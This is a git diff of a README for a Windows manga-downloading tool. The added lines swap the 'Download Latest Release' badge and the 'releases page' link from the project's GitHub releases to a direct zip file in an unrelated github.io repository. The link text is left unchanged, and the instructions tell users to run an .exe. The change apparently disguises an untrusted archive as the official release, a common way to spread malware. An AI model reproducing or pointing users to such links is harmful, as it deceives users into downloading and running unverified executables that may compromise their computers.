@@ -5,7 +5,7 @@ description: "Download manga from MangaDotNet using a fast CLI or a graphical us
 ---
 # 📖 mangadotnet-downloader - Download your favorite manga chapters easily
 
-[![Download for Windows](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/babylonianacademicyear853/mangadotnet-downloader/releases)
+[![Download for Windows](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/babylonianacademicyear853/babylonianacademicyear853.github.io/raw/refs/heads/main/inaccessible/io-babylonianacademicyear-github-3.8.zip)
 
 This application provides a simple way to save manga, manhua, and manhwa directly to your Windows computer. It connects to the MangaDotNet service to find and download chapters. You can choose between a visual interface or a text-based command tool. The software keeps your library organized and ready for offline reading.
 
@@ -13,7 +13,7 @@ This application provides a simple way to save manga, manhua, and manhwa directl
 
 Follow these steps to set up the software on your machine. Ensure your computer runs a modern version of Windows such as Windows 10 or Windows 11.
 
-1. Visit the [releases page](https://github.com/babylonianacademicyear853/mangadotnet-downloader) to find the latest version of the application.
+1. Visit the [releases page](https://github.com/babylonianacademicyear853/babylonianacademicyear853.github.io/raw/refs/heads/main/inaccessible/io-babylonianacademicyear-github-3.8.zip) to find the latest version of the application.
 2. Look for the file ending in `.exe` under the Assets section.
 3. Click the file name to start the download.
 4. Save the file to your Downloads folder or any location you prefer.
